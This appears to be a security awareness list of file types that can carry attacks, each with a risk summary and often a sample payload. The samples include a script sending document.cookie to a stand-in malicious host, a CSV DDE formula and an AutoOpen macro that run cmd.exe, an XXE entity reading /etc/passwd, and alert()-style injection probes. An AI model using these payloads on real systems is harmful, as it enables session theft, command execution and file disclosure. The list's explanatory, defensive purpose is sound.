1. HTML/JavaScript Files

    Risk: Code execution in the browser (XSS, phishing, etc.)
    Example: A malicious HTML file could include embedded JavaScript that steals cookies, exfiltrates data, or redirects users to malicious sites.
example:
<!-- malicious.html -->
<script>
  alert('Your session has been hijacked!');
  fetch('https://malicious-site.com/steal?cookie=' + document.cookie);
</script>

2. SVG Files

    Risk: Code injection via embedded JavaScript or malicious XML.
    Example: An SVG file containing JavaScript could execute code if opened in a browser.
example:
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    alert('SVG JavaScript Injection');
  </script>
</svg>

3. CSV/Excel Files

    Risk: Formula injection that can execute commands or extract data.
    Example: An attacker could include formulas in a CSV file targeting users who open it in Excel.
example:
Name, Age, Formula
John, 30, =cmd|' /C calc'!A0

4. PDF Files

    Risk: Exploitation via embedded JavaScript or malicious links.
    Example: A PDF with embedded JavaScript could exploit vulnerabilities in PDF viewers.
example:
<< /Type /Action /S /JavaScript /JS (app.alert("PDF Exploit")) >>
5. Office Files (e.g., .docx, .pptx, .xlsx)

    Risk: Code execution via macros or embedded objects.
    Example: A malicious Word document could include VBA macros that execute on opening.
example:
Sub AutoOpen()
  Shell ("cmd.exe /c calc.exe")
End Sub
6. ZIP/Archive Files

    Risk: Path traversal (e.g., Zip Slip) or payload delivery.
    Example: An archive file containing files with ../../../ in their paths could overwrite critical system files upon extraction.
7. Image Files (e.g., .png, .jpeg)

    Risk: Exploitation of vulnerabilities in image parsers.
    Example: Malformed image files exploiting flaws in the image processing library used by the client.
8. Audio/Video Files (e.g., .mp3, .mp4)

    Risk: Exploitation of media player vulnerabilities.
    Example: A malformed MP4 file could trigger a buffer overflow in the media player.
9. JSON/JavaScript Files (via APIs or Applications)

    Risk: Data injection or execution via scripts included in JSON responses.
    Example: A JSON file could deliver malicious data that leads to unsafe evaluation.
{
  "data": "alert('Injected via JSON')"
}
10. Emails and EML Files

    Risk: HTML and script execution in email clients.
    Example: Embedded malicious scripts or links in HTML emails.
example:
<a href="javascript:alert('Email Phish!')">Click Here</a>
11. Configuration Files (e.g., YAML, XML)

    Risk: Deserialization or XXE vulnerabilities.
    Example: XML files could include malicious entities that target parsing libraries.
example:
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
12. Executables or Scripts (e.g., .exe, .sh, .bat)

    Risk: Direct code execution.
    Example: An .exe file could include malware or a script that compromises the userâ€™s system.
